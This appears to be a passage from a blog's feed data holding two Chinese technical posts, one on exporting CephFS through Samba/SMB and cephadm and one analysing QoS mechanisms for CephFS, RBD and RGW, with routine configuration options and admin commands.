ceph:config_file = /etc/ceph/ceph.conf<br>    ceph:user_id = samba.gw<br>    ceph:filesystem = cephfs<br>    kernel share modes = no<br>    oplocks = no<br>    write list = @samba<br></code></pre></td></tr></table></figure><p>参数解析:</p><ul><li><code>vfs objects</code> : 使用存储方式为 ceph 。</li><li><code>path</code> : 路径是 Ceph 文件系统中的绝对路径。</li><li><code>ceph:config_file</code> : 设置使用的 ceph 配置文件。</li><li><code>ceph:user_id</code> : 设置用于 CephFS 挂载句柄的客户端 ID 。</li><li><code>ceph:filesystem</code> : 设置使用的 CephFS 文件系统。</li><li><code>kernel share modes</code> : 必需禁用 kernel share modes ，以使文件服务正常工作。</li><li><code>oplocks</code> : 又称为 SMB2+ 租用，可通过加速客户端缓存来提升性能，不过如果将其他 CephFS 客户端（例如内核 mount.ceph、FUSE 或 NFS Ganesha）与 Samba 一起部署，该机制目前并不安全。如果所有 CephFS 文件系统路径访问都专由 Samba 处理，则可安全启用 oplocks 参数。</li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重启服务</span><br>systemctl restart smb.service<br><br><span class="hljs-comment"># 查看服务状态</span><br>systemctl status smb.service<br>systemctl <span class="hljs-built_in">enable</span> smb.service<br></code></pre></td></tr></table></figure><h2 id="2-3、通过-cephadm-使用"><a href="#2-3、通过-cephadm-使用" class="headerlink" title="2.3、通过 cephadm 使用"></a>2.3、通过 cephadm 使用</h2><p>按照官方文档 <a href="https://docs.ceph.com/en/latest/cephadm/services/smb/">cephadm&#x2F;services&#x2F;smb</a> 介绍，我们可以通过 cephadm 来编排 samba 服务。但是目前该功能还处于开发状态，许多功能可能缺失或者不成熟。其他的相关文档 <a href="https://docs.ceph.com/en/latest/mgr/smb/">latest&#x2F;mgr&#x2F;smb</a> 。</p><p>我们发现 ceph 官方在 2025年01月28日 发布了一篇 <a href="https://ceph.io/en/news/blog/2025/smb-manager-module/">SMB Meets Squid: Introducing the New Ceph SMB Manager Module for SMB Service Management in Ceph</a> 文章，其中提到了从 Squid 19.2.3 开始，SMB 的部分功能可以使用，到 Tentacle 20.x.x 版本的时候将会提供完整支持。并且文章中提到了具体的操作命令，但是其中的一些命令，比如 <code>ceph smb cluster *</code> 在 Squid 19.2.3 版本中并没有，只有 Tentacle 20.x.x 版本中才有，因此为了测试该功能，我们需要编译构建 <a href="https://github.com/ceph/ceph/tree/v20.0.0">v20.0.0</a> 版本的安装包进行测试。</p><h3 id="2-3-1、配置-Ceph-环境"><a href="#2-3-1、配置-Ceph-环境" class="headerlink" title="2.3.1、配置 Ceph 环境"></a>2.3.1、配置 Ceph 环境</h3><p>按照以上文档中的描述，为了启用 ceph smb 环境，我们可以使用两种方法来操作： <a href="https://docs.ceph.com/en/latest/mgr/smb/#mgr-smb-imperative">命令式方法</a> 和 <a href="https://docs.ceph.com/en/latest/mgr/smb/#mgr-smb-declarative">声明式方法</a> 。在官方 <a href="https://ceph.io/en/news/blog/2025/smb-manager-module/">SMB Meets Squid: Introducing the New Ceph SMB Manager Module for SMB Service Management in Ceph</a> 文章中也有详细的描述和操作命令。</p><p><strong>相关命令:</strong> （使用命令式方法执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 CephFS 卷/子卷</span><br>ceph fs volume create cephfs<br>ceph fs subvolumegroup create cephfs smb<br>ceph fs subvolume create cephfs sv1 --group-name=smb --mode=0777<br>ceph fs subvolume create cephfs sv2 --group-name=smb --mode=0777<br><br><span class="hljs-comment"># 启用 SMB 管理模块</span><br>ceph mgr module <span class="hljs-built_in">enable</span> smb --force<br>ceph mgr module <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 创建 SMB 群集/共享</span><br>ceph smb cluster create smb1 user --define-user-pass=user1%passwd<br>ceph smb share create smb1 share1 cephfs / --subvolume=smb/sv1<br></code></pre></td></tr></table></figure><h2 id="2-4、通过-Windows-客户端访问"><a href="#2-4、通过-Windows-客户端访问" class="headerlink" title="2.4、通过 Windows 客户端访问"></a>2.4、通过 Windows 客户端访问</h2><p>这种方式和 Samba 并没有关系，但是同样也解决了在 Windows 机器上访问 CephFS 存储的需求，</p><h1 id="三、参考资料"><a href="#三、参考资料" class="headerlink" title="三、参考资料"></a>三、参考资料</h1><ul><li><a href="https://www.samba.org/">https://www.samba.org/</a></li><li><a href="https://www.samba.org/samba/docs/current/man-html/">https://www.samba.org/samba/docs/current/man-html/</a></li><li><a href="https://blog.csdn.net/vecloud/article/details/121604790">https://blog.csdn.net/vecloud/article/details/121604790</a></li><li><a href="https://docs.ceph.com/en/latest/install/windows-install/">https://docs.ceph.com/en/latest/install/windows-install/</a></li><li><a href="https://docs.ceph.com/en/latest/mgr/smb/">https://docs.ceph.com/en/latest/mgr/smb/</a></li><li><a href="https://docs.ceph.com/en/latest/cephadm/services/smb/">https://docs.ceph.com/en/latest/cephadm/services/smb/</a></li><li><a href="https://cloudbase.it/ceph-for-windows/">https://cloudbase.it/ceph-for-windows/</a></li><li><a href="https://www.yisu.com/jc/23823.html">https://www.yisu.com/jc/23823.html</a></li><li><a href="https://blog.csdn.net/skdkjzz/article/details/80987382">https://blog.csdn.net/skdkjzz/article/details/80987382</a></li><li><a href="https://documentation.suse.com/zh-cn/ses/7.1/html/ses-all/cha-ses-cifs.html">https://documentation.suse.com/zh-cn/ses/7.1/html/ses-all/cha-ses-cifs.html</a></li><li><a href="https://knowledgebase.45drives.com/kb/kb450417-creating-smb-shares-in-ceph/">https://knowledgebase.45drives.com/kb/kb450417-creating-smb-shares-in-ceph/</a></li><li><a href="https://serverfault.com/questions/1161981/ceph-manager-daemon-smb-module-is-not-available">https://serverfault.com/questions/1161981/ceph-manager-daemon-smb-module-is-not-available</a></li><li><a href="https://www.linux-magazine.com/Issues/2016/191/Clustered-Samba">https://www.linux-magazine.com/Issues/2016/191/Clustered-Samba</a></li><li><a href="https://chemnitzer.linux-tage.de/2019/media/programm/folien/227.pdf">https://chemnitzer.linux-tage.de/2019/media/programm/folien/227.pdf</a></li><li><a href="https://www.youtube.com/watch?v=5v8L7FhIyOw&ab_channel=Ceph">https://www.youtube.com/watch?v=5v8L7FhIyOw&amp;ab_channel=Ceph</a></li><li><a href="https://www.reddit.com/r/ceph/comments/10ht3hz/smb_exports_from_ceph/">https://www.reddit.com/r/ceph/comments/10ht3hz/smb_exports_from_ceph/</a></li><li><a href="https://www.samba.org/samba/docs/man/">https://www.samba.org/samba/docs/man/</a></li><li><a href="https://sambaxp.org/fileadmin/user_upload/sambaXP2018-Slides/disseldorp-ceph-samba.pdf">https://sambaxp.org/fileadmin/user_upload/sambaXP2018-Slides/disseldorp-ceph-samba.pdf</a></li><li><a href="https://www.youtube.com/watch?v=Gel9elLSEsQ&t=704s&ab_channel=45Drives">https://www.youtube.com/watch?v=Gel9elLSEsQ&amp;t=704s&amp;ab_channel=45Drives</a></li><li><a href="https://www.cnblogs.com/suv789/p/17455160.html">https://www.cnblogs.com/suv789/p/17455160.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph QoS 机制深入分析</title>
      <link href="/2024/10/25/ceph-qos/"/>
      <url>/2024/10/25/ceph-qos/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CephFS-QoS"><a href="#一、CephFS-QoS" class="headerlink" title="一、CephFS QoS"></a>一、CephFS QoS</h1><p>社区的相关实现：</p><ul><li>基于 tokenbucket 算法的目录 QoS : <a href="https://github.com/ceph/ceph/pull/29266">https://github.com/ceph/ceph/pull/29266</a></li><li>基于 dmclock 算法的 subvolume QoS : 来自日本的 line 公司提出的想法，<a href="https://github.com/ceph/ceph/pull/38506">https://github.com/ceph/ceph/pull/38506</a> ， <a href="https://github.com/ceph/ceph/pull/52147">https://github.com/ceph/ceph/pull/52147</a></li></ul><h2 id="1-1、基于-TokenBucket-算法的目录-QoS"><a href="#1-1、基于-TokenBucket-算法的目录-QoS" class="headerlink" title="1.1、基于 TokenBucket 算法的目录 QoS"></a>1.1、基于 TokenBucket 算法的目录 QoS</h2><p>该实现并未合并到主分支。</p><p><img src="/assets/images/ceph-qos-tokenbucket.png" alt="tokenbucket qos" loading="lazy"></p><p><strong>相关材料：</strong></p><ul><li>社区的原始PR: <a href="https://github.com/ceph/ceph/pull/29266">https://github.com/ceph/ceph/pull/29266</a></li></ul><p><strong>实现特点：</strong></p><ul><li>基于 <code>TokenBucketThrottle</code> 类在客户端侧实现的 <code>TokenBucket</code> 类型的 <code>QoS</code>，用于约束每个独立的客户端的访问请求；</li><li><code>QoS</code> 的限制粒度为每个独立的客户端，没有全局的QoS限制；</li><li>用于限制目录级别的操作 <code>QoS</code>；</li><li>支持 <code>IOPS</code> 和 <code>BPS</code> 的 <code>QoS</code> 限制，且支持突发流量；</li><li>仅支持 <code>FUSE</code> 类型的挂载方式，该代码未引入 Linux 内核，所以暂不支持 <code>Kernel</code> 类型的挂载方式；</li></ul><p><strong>相关命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># getfattr</span><br>getfattr -d /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.limit.iops /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.burst.iops /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.limit.read_iops /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.burst.read_iops /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.limit.write_iops /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.burst.write_iops /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.limit.bps /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.burst.bps /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.limit.read_bps /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.burst.read_bps /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.limit.write_bps /mnt/cephfs/testdirs/<br>getfattr -n ceph.qos.burst.write_bps /mnt/cephfs/testdirs/<br><br><span class="hljs-comment"># setfattr</span><br>setfattr -n ceph.qos.limit.iops -v 200 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.burst.iops -v 2000 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.limit.read_iops -v 100 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.burst.read_iops -v 1000 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.limit.write_iops -v 100 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.burst.write_iops -v 1000 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.limit.bps -v 500 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.burst.bps -v 2000 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.limit.read_bps -v 100 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.burst.read_bps -v 1000 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.limit.write_bps -v 300 /mnt/cephfs/testdirs/<br>setfattr -n ceph.qos.burst.write_bps -v 1000 /mnt/cephfs/testdirs/<br></code></pre></td></tr></table></figure><h2 id="1-2、基于-mclock-算法的-subvolume-QoS"><a href="#1-2、基于-mclock-算法的-subvolume-QoS" class="headerlink" title="1.2、基于 mclock 算法的 subvolume QoS"></a>1.2、基于 mclock 算法的 subvolume QoS</h2><p>该方案是由日本的 Line 公司开发的，该方案已经在他们内部环境线上运行。然后在 2023 年的 Cephalcon 上进行了分享。该实现并未合并到主分支。</p><p><img src="/assets/images/ceph-qos-mclock-subvolume.png" alt="mclock subvolume qos" loading="lazy"></p><p><strong>相关材料：</strong></p><ul><li>ceph dmclock 项目代码: <a href="https://github.com/ceph/dmclock">https://github.com/ceph/dmclock</a></li><li>Cephalcon 2023 关于 MDS QoS 的演讲日程: <a href="https://ceph2023.sched.com/event/1JKas/optimizing-cephfs-with-combining-mds-qos-scheduling-and-static-dynamic-subtree-partitioning-yongseok-oh-jinmyeong-lee-line">https://ceph2023.sched.com/event/1JKas/optimizing-cephfs-with-combining-mds-qos-scheduling-and-static-dynamic-subtree-partitioning-yongseok-oh-jinmyeong-lee-line</a></li><li>Cephalcon 2023 关于 MDS QoS 的演讲视频: <a href="https://www.youtube.com/watch?v=pDURll6Y-Ug#t=21m07s">https://www.youtube.com/watch?v=pDURll6Y-Ug#t=21m07s</a></li><li>社区的第一版提交代码: <a href="https://github.com/ceph/ceph/pull/38506">https://github.com/ceph/ceph/pull/38506</a></li><li>社区的第二版提交代码: <a href="https://github.com/ceph/ceph/pull/52147">https://github.com/ceph/ceph/pull/52147</a></li><li>Ceph MDS QoS Tracker: <a href="https://tracker.ceph.com/issues/48509">https://tracker.ceph.com/issues/48509</a></li><li>Ceph MDS QoS 邮件列表讨论记录: <a href="https://lists.ceph.io/hyperkitty/list/dev@ceph.io/thread/XO33ZPJ3BONNIKWMGN6A7K62F74C5AJO/">https://lists.ceph.io/hyperkitty/list/dev@ceph.io/thread/XO33ZPJ3BONNIKWMGN6A7K62F74C5AJO/</a></li><li>dmClock: Handling Throughput Variability for Hypervisor IO Scheduling 论文: <a href="https://www.usenix.org/legacy/events/osdi10/tech/full_papers/Gulati.pdf">https://www.usenix.org/legacy/events/osdi10/tech/full_papers/Gulati.pdf</a></li></ul><p><strong>实现特点：</strong></p><ul><li>从 <code>MDS</code> 侧改造支持，无需客户端改造支持；</li><li>限制了客户端对 <code>subvolume</code> 的元数据请求（create&#x2F;mkdir&#x2F;lookup等）的 <code>QoS</code> ， 限制粒度为 <code>subvolume</code> ；</li><li>如果多个客户端挂载了相同的 <code>subvolume</code>，则多个客户端的综合性能之和满足对应的 <code>subvolume</code> 的 <code>QoS</code> 限制；</li><li>多个 <code>MDS</code> 均可针对不同的 <code>subvolume</code> 配置对应的 <code>QoS</code> ，但是 <code>MDS</code> 间该配置相互独立，所以虽然社区 <code>PR</code> 中叫做 <code>dmclock</code>，但是目前使用的仍是 <code>mclock</code> 的逻辑；</li><li>只有 <code>active</code> 的 <code>MDS</code> 才会尝试开启该特性，如果对应的 <code>MDS</code> 状态发生了变化，该特性也会尝试开启或者关闭；</li><li>处理客户端请求时，会解析对应请求所属的 <code>subvolume</code> ， 从而判断是否执行 <code>QoS</code> 约束限制；</li><li><code>dmclock</code> 的后端实现依赖于 <code>crimson::dmclock::PushPriorityQueue</code> 类的实现, 相关代码位于 <code>src/dmclock/src/dmclock_server.h</code> 文件中的 <code>crimson::dmclock::PriorityQueueBase::do_add_request</code> 函数；</li></ul><p><strong>相关配置：</strong></p><ul><li>全局配置：<ul><li><code>mds_dmclock_enable</code> : 使用启用 <code>dmclock</code> 的 <code>QoS</code> 功能， 默认为 <code>false</code> ；</li><li><code>mds_dmclock_limit</code> : 限制每个 <code>subvolume</code> 的 <code>QoS</code> 的上限，默认值为 <code>1000</code> ， 需要使用 <code>qos set</code> 命令来操作开启 <code>subvolume</code> 的该配置；</li><li><code>mds_dmclock_reservation</code> : 限制每个 <code>subvolume</code> 的 <code>QoS</code> 的预留值，默认值为 <code>1000</code> ， 需要使用 <code>qos set</code> 命令来操作开启 <code>subvolume</code> 的该配置；</li><li><code>mds_dmclock_weight</code> : 限制每个 <code>subvolume</code> 的 <code>QoS</code> 的权重，默认值为 <code>1000</code> ， 需要使用 <code>qos set</code> 命令来操作开启 <code>subvolume</code> 的该配置；</li></ul></li><li>subvolume 配置：<ul><li><code>limit</code> : 限制每个 <code>subvolume</code> 的 <code>QoS</code> 的上限，该值需不小于 <code>reservation</code> ；</li><li><code>reservation</code> : 限制每个 <code>subvolume</code> 的 <code>QoS</code> 的预留值；</li><li><code>weight</code> : 限制每个 <code>subvolume</code> 的 <code>QoS</code> 的权重；</li></ul></li></ul><p><strong>相关命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># global config</span><br>ceph daemon mds.fs01 config get mds_dmclock_enable <span class="hljs-literal">true</span>/false<br>ceph daemon mds.fs01 config get mds_dmclock_limit <span class="hljs-variable">$limit</span><br>ceph daemon mds.fs01 config get mds_dmclock_reservation <span class="hljs-variable">$reservation</span><br>ceph daemon mds.fs01 config get mds_dmclock_weight <span class="hljs-variable">$weight</span><br><br><span class="hljs-comment"># dump qos info</span><br>ceph daemon mds.fs01 dump qos<br><br><span class="hljs-comment"># get qos info</span><br>ceph daemon mds.fs01 qos get <span class="hljs-variable">$subvol_path</span><br><br><span class="hljs-comment"># set qos info</span><br>ceph daemon mds.fs01 qos <span class="hljs-built_in">set</span> <span class="hljs-variable">$subvol_path</span> <span class="hljs-variable">$reservation</span> <span class="hljs-variable">$weight</span> <span class="hljs-variable">$limit</span><br>ceph daemon mds.fs01 qos <span class="hljs-built_in">rm</span> <span class="hljs-variable">$subvol_path</span><br></code></pre></td></tr></table></figure><h2 id="1-3、基于-mclock-算法-user-QoS"><a href="#1-3、基于-mclock-算法-user-QoS" class="headerlink" title="1.3、基于 mclock 算法 user QoS"></a>1.3、基于 mclock 算法 user QoS</h2><p>该方案相比于 <strong>1.2、基于 mclock 算法的 subvolume QoS</strong> 的实现，限制的粒度有所不同，1.2 中提到的限制粒度是基于 subvolume ，而该方案中限制 auth user ，后端的具体实现基本一致。</p><p><strong>实现特点：</strong></p><ul><li>限制粒度为 auth user ，可针对不同的用户自定义访问 QoS ；</li><li>不依赖于 subvolume 的特性，即使业务不使用 subvolume 也能使用；</li><li>在多 MDS 的情况下，由于用户的访问请求可能会打到不同的 MDS 上，并且目前 MDS 间没有针对于用户的总访问请求进行沟通（即后端 MDS 对于 QoS 的限制是相互独立的），所以可能需要针对用户的访问目录进行一定的约束，或者在限制用户的总 QoS 的数量时考虑除以特定的 MDS 的数量来进行均摊访问限制；</li></ul><h1 id="二、CephRBD-QoS"><a href="#二、CephRBD-QoS" class="headerlink" title="二、CephRBD QoS"></a>二、CephRBD QoS</h1><p>以下分析基于 Ceph <a href="https://github.com/ceph/ceph/tree/v18.2.7">V18.2.7</a> 分支代码。</p><p><img src="/assets/images/ceph-qos-mclock-rbd.png" alt="mclock rbd qos" loading="lazy"></p><p><strong>相关材料：</strong></p><ul><li>Ceph RBD QoS 的资料: <a href="https://docs.ceph.com/en/latest/rbd/rbd-config-ref/#qos-settings">https://docs.ceph.com/en/latest/rbd/rbd-config-ref/#qos-settings</a></li><li>相关PR: <a href="https://github.com/ceph/ceph/pull/17032">https://github.com/ceph/ceph/pull/17032</a> ， <a href="https://github.com/ceph/ceph/pull/21635">https://github.com/ceph/ceph/pull/21635</a></li></ul><p><strong>实现特点：</strong></p><ul><li>基于 TokenBucket 实现的 QoS；</li><li>在客户端侧进行实现，每个客户端之间的限制互不关联，相互独立；</li><li>当启用多个限制条件时，最终会依据配置的最严格的限制条件；</li><li>配置信息以 OMAP 的方式存储在对应 pool 中的 image 的 header 对象中，可以通过 <code>rbd info ceph-rbd/rbd01.img</code> 命令查看 <code>block_name_prefix</code> 字段中的后缀信息，之后使用 <code>rados -p ceph-rbd listomapvals rbd_header.$postfix</code> 命令来获取已经设置过的配置信息；</li></ul><p><strong>相关配置：</strong></p><ul><li><code>rbd_qos_iops_limit</code> : 每秒 IO 操作的期望限制，默认为 0 ；</li><li><code>rbd_qos_iops_burst</code> : 所需的 IO 操作突发限制，默认为 0 ；</li><li><code>rbd_qos_iops_burst_seconds</code> : IO 操作所需的突发持续时间（以秒为单位），默认为 1秒 ；</li><li><code>rbd_qos_read_iops_limit</code> : 每秒读取操作的期望限制，默认为 0 ；</li><li><code>rbd_qos_read_iops_burst</code> : 所需的读取操作突发限制，默认为 0 ；</li><li><code>rbd_qos_read_iops_burst_seconds</code> : 读取操作所需的突发持续时间（以秒为单位），默认为 1秒 ；</li><li><code>rbd_qos_write_iops_limit</code> : 每秒写入操作的期望限制，默认为 0 ；</li><li><code>rbd_qos_write_iops_burst</code> : 所需的写入操作突发限制，默认为 0 ；</li><li><code>rbd_qos_write_iops_burst_seconds</code> : 写入操作所需的突发持续时间（以秒为单位），默认为 1秒 ；</li><li><code>rbd_qos_bps_limit</code> : 每秒 IO 字节数的期望限制，默认为 0 ；</li><li><code>rbd_qos_bps_burst</code> : 所需的 IO 字节突发限制，默认为 0 ；</li><li><code>rbd_qos_bps_burst_seconds</code> : 所需的 IO 字节突发持续时间（以秒为单位），默认为 1秒 ；</li><li><code>rbd_qos_read_bps_limit</code> : 每秒读取字节数的期望限制，默认为 0 ；</li><li><code>rbd_qos_read_bps_burst</code> : 所需的读取字节突发限制，默认为 0 ；</li><li><code>rbd_qos_read_bps_burst_seconds</code> : 所需的读取字节突发持续时间（以秒为单位），默认为 1秒 ；</li><li><code>rbd_qos_write_bps_limit</code> : 每秒写入字节数的期望限制，默认为 0 ；</li><li><code>rbd_qos_write_bps_burst</code> : 所需的写入字节突发限制，默认为 0 ；</li><li><code>rbd_qos_write_bps_burst_seconds</code> : 所需的写入字节突发持续时间（以秒为单位），默认为 1秒 ；</li><li><code>rbd_qos_schedule_tick_min</code> : 这决定了当达到节流阀的限制时，I&#x2F;O 可以解除阻塞的最短时间（以毫秒为单位）。就令牌桶算法而言，这是将令牌添加到桶中的最小间隔。默认为 50秒；</li><li><code>rbd_qos_exclude_ops</code> : 可选地从 QoS 中排除操作。此设置接受整数位掩码值或以逗号分隔的操作名称字符串。此设置始终在内部存储为整数位掩码值。操作位掩码值和操作名称之间的映射如下：+1 -&gt; read，+2 -&gt; write，+4 -&gt; discreply，+8 -&gt; write_same，+16 -&gt; compare_and_write ；</li></ul><p><strong>相关命令：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ceph-rbd is pool name , rbd01.img is image name</span><br><br><span class="hljs-comment"># get pool/image info</span><br>rbd info ceph-rbd/rbd01.img<br><br><span class="hljs-comment"># get configs from pool object</span><br>rados -p ceph-rbd listomapvals rbd_header.<span class="hljs-variable">$postfix</span><br><br><span class="hljs-comment"># bench test</span><br>rbd bench -p ceph-rbd --image rbd01.img --io-size 4K --io-total 10G --io-type <span class="hljs-built_in">read</span><br>rbd bench -p ceph-rbd --image rbd01.img --io-size 4K --io-total 10G --io-type write<br><br><span class="hljs-comment"># get</span><br>rbd config image get ceph-rbd/rbd01.img rbd_qos_iops_limit<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_iops_burst<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_iops_burst_seconds<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_read_iops_limit<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_read_iops_burst<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_read_iops_burst_seconds<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_write_iops_limit<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_write_iops_burst<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_write_iops_burst_seconds<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_bps_limit<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_bps_burst<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_bps_burst_seconds<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_read_bps_limit<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_read_bps_burst<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_read_bps_burst_seconds<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_write_bps_limit<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_write_bps_burst<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_write_bps_burst_seconds<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_schedule_tick_min<br>rbd config image get ceph-rbd/rbd01.img rbd_qos_exclude_ops<br><br><span class="hljs-comment"># set</span><br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_iops_limit 1000<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_iops_burst 2000<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_iops_burst_seconds 5<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_read_iops_limit 100<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_read_iops_burst 200<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_read_iops_burst_seconds 5<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_write_iops_limit 200<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_write_iops_burst 400<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_write_iops_burst_seconds 5<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_bps_limit 104857600<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_bps_burst 209715200<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_bps_burst_seconds 5<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_read_bps_limit 10485760<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_read_bps_burst 20971520<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_read_bps_burst_seconds 5<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_write_bps_limit 20971520<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_write_bps_burst 41943040<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_write_bps_burst_seconds 5<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_schedule_tick_min 60<br>rbd config image <span class="hljs-built_in">set</span> ceph-rbd/rbd01.img rbd_qos_exclude_ops<br><br><span class="hljs-comment"># remove item</span><br>rbd config image remove ceph-rbd/rbd01.img <span class="hljs-variable">$ITEM</span><br></code></pre></td></tr></table></figure><h1 id="三、CephRGW-QoS"><a href="#三、CephRGW-QoS" class="headerlink" title="三、CephRGW QoS"></a>三、CephRGW QoS</h1><p>以下分析基于 Ceph <a href="https://github.com/ceph/ceph/tree/v18.2.7">V18.2.7</a> 分支代码。</p><p><strong>相关材料：</strong></p><ul><li>Ceph RGW QoS 的资料: <a href="https://docs.ceph.com/en/latest/radosgw/config-ref/#qos-settings">https://docs.ceph.com/en/latest/radosgw/config-ref/#qos-settings</a></li><li>基于 mClock 的 QoS: <a href="https://docs.ceph.com/en/reef/rados/configuration/osd-config-ref/#dmclock-qos">https://docs.ceph.com/en/reef/rados/configuration/osd-config-ref/#dmclock-qos</a></li></ul><p><strong>实现特点：</strong></p><ul><li>从 Nautilus 版本中引入，当前最新代码尚处于实验阶段，不建议用于生产环境；</li><li>基于 mClock 实现的 QoS ，后端 mclock 的实现采用 <code>crimson::dmclock::PullPriorityQueue</code> 类；</li><li>当 osd_op_queue 配置的值为 mclock_scheduler 时才会启用 mclock 算法；如果使用 throttler 调度器则只是一个普通的限流器，用于判断是否返回到达限制错误，没有使用 mclock 的算法实现；</li><li>每次调度请求时，先会调用 <code>PullPriorityQueue::add_request</code> 函数记录请求，之后会立刻通过 <code>AsyncScheduler::process</code> 函数来调用 <code>PullPriorityQueue::pull_request</code> 函数处理请求；</li><li>该 mclock 实现的是不同的请求类别（admin&#x2F;auth&#x2F;data&#x2F;metadata）间的 QoS 控制，详细对应的 OP 操作类别关系如下：<ul><li>admin 请求类别对应的操作为 <code>RGWGetClusterStat/RGWRESTOp</code> ；</li><li>auth 请求类别对应的操作为 <code>RGW_SWIFT_Auth_Get</code> ；</li><li>data 请求类别对应的操作为 <code>RGWGetObj/RGWBulkDelete/RGWBulkUploadOp/RGWPutObj/RGWPostObj/RGWDeleteObj/RGWCopyObj</code> ;</li><li>metadata 请求类别对应的操作为 <code>RGWOp/RGWGetBucketPolicyStatus/RGWPutBucketPublicAccessBlock/RGWGetBucketPublicAccessBlock/RGWDeleteBucketPublicAccessBlock</code> ；</li></ul></li></ul><p><strong>相关配置：</strong></p><ul><li><code>rgw_scheduler_type</code> : 使用的 RGW 调度程序。可选值为 throttler 和 dmclock ，默认值为 throttler 。 当使用 dmclock 时会采用 <code>dmc::AsyncScheduler</code> 调度器， 当使用 throttler 时会采用 <code>dmc::SimpleThrottler</code> 调度器；</li><li><code>rgw_max_concurrent_requests</code> : Beast 前端能够处理的最大并发 HTTP 请求数。调整此值有助于限制高负载下的内存使用量。默认值为 1024 ；<ul><li>当 rgw_scheduler_type 配置为 throttler 时， 该值用于限制同时最大请求的数量，超过此值会快速失败，并返回客户端 <code>-ERR_RATE_LIMITED</code> 错误，如果没有到达最大限制，则会正常执行；</li><li>当 rgw_scheduler_type 配置为 dmclock 时，</li></ul></li><li><code>rgw_dmclock_admin_res</code> : mclock 预留给管理员请求，默认值为 100.0 ；</li><li><code>rgw_dmclock_admin_wgt</code> : 管理请求的 mclock 权重，默认值为 100.0 ；</li><li><code>rgw_dmclock_admin_lim</code> : 管理请求的 mclock 限制，默认值为 0.0 ；</li><li><code>rgw_dmclock_auth_res</code> : 对象数据请求的 mclock 保留，默认值为 200.0 ；</li><li><code>rgw_dmclock_auth_wgt</code> : 对象数据请求的 mclock 权重，默认值为 100.0 ；</li><li><code>rgw_dmclock_auth_lim</code> : 对象数据请求的 mclock 限制，默认值为 0.0 ；</li><li><code>rgw_dmclock_data_res</code> : 用于对象数据请求的 mclock 保留，默认值为 500.0 